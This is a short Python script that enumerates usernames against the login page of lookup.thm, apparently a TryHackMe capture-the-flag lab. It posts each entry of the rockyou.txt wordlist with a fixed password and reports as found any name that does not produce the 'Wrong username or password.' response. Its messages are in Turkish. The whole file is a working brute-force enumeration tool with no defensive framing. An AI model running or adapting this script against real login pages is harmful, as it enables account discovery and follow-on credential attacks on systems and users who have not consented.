import requests

url = "http://lookup.thm/login.php"
filePath = "/home/kali/Desktop/rockyou.txt"

with open(filePath, "r") as file:
    for lines in file:
        usernameTry = lines.strip()
        if not usernameTry:
            continue

        else:
            data = {"username":usernameTry, "password":"password"}
            response = requests.post(url=url, data=data, timeout=6)

            if "Wrong username or password." in response.text:
                print("[*] Kullanıcı Adı Bulunamadı: {}".format(usernameTry))
                continue

            else:
                print("[*] Kullanıcı Adı BULUNDU {}".format(usernameTry))
